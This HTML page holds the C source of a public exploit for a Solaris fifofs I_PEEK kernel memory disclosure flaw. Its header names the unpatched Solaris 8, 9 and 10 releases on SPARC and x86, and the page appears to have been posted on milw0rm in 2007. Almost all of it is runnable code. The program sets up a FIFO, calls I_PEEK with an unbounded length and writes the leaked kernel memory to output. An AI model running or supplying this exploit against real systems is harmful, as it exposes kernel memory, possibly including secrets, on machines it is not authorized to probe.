<html><head><title>Solaris fifofs I_PEEK Kernel Memory Disclosure Exploit (x86/sparc)</title></head><pre>/* 10/2007: public release
 * SPARC
 *   Solaris  8 without 109454-06
 *   Solaris  9 without 117471-04
 *   Solaris 10 without 127737-01
 * x86
 *   Solaris  8 without 109455-06
 *   Solaris  9 without 117472-04
 *   Solaris 10 without 127738-01
 *
 * Solaris fifofs I_PEEK Kernel Memory Disclosure
 * By qaaz
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stropts.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;

#define PAGE_COUNT	1000

int	main(int argc, char *argv[])
{
	struct strpeek	strpeek;
	char		*buf, *end;
	int		pg = PAGE_COUNT, fd, pagesz, bufsz;

	fprintf(stderr,
		&quot;---------------------------------------\n&quot;
		&quot; Solaris fifofs I_PEEK Kmem Disclosure\n&quot;
		&quot; By qaaz\n&quot;
		&quot;---------------------------------------\n&quot;);

	if (argc &gt; 1) pg = atoi(argv[1]);

	pagesz = getpagesize();

	if (mknod(&quot;fifo&quot;, S_IFIFO | 0666, 0) &lt; 0) {
		perror(&quot;mknod&quot;);
		return -1;
	}

	switch (fork()) {
	case -1:
		perror(&quot;fork&quot;);
		goto cleanup;
	case  0:
		if ((fd = open(&quot;fifo&quot;, O_WRONLY)) &lt; 0) {
			perror(&quot;open&quot;);
			exit(0);
		}
		write(fd, &quot;abcd&quot;, 4);
		exit(0);
		break;
	default:
		if ((fd = open(&quot;fifo&quot;, O_RDONLY)) &lt; 0) {
			perror(&quot;open&quot;);
			goto cleanup;
		}
		break;
	}

	bufsz = (pg + 1) * pagesz;
	if (!(buf = memalign(pagesz, bufsz))) {
		perror(&quot;malloc&quot;);
		goto cleanup;
	}
	
	memset(buf, 0, bufsz);
	end = buf + (pg * pagesz);
	
	fprintf(stderr, &quot;-&gt; [ %p .. %p ]\n&quot;, buf, end);
	fflush(stderr);

	if (mprotect(end, pagesz, PROT_NONE) &lt; 0) {
		perror(&quot;mprotect&quot;);
		goto cleanup;
	}

	memset(&amp;strpeek, 0, sizeof(strpeek));
	strpeek.databuf.buf = buf;
	strpeek.databuf.maxlen = -1;
	if (ioctl(fd, I_PEEK, &amp;strpeek) &lt; 0) {
		perror(&quot;ioctl&quot;);
		goto cleanup;
	}

	while (end &gt; buf &amp;&amp; end[-1] == 0)
		end--;
	fprintf(stderr, &quot;== %d\n&quot;, (int) (end - buf));
	fflush(stderr);

	if (!isatty(1))
		write(1, buf, (size_t) (end - buf));

cleanup:
	unlink(&quot;fifo&quot;);
	return 0;
}

// milw0rm.com [2007-10-10]</pre></html>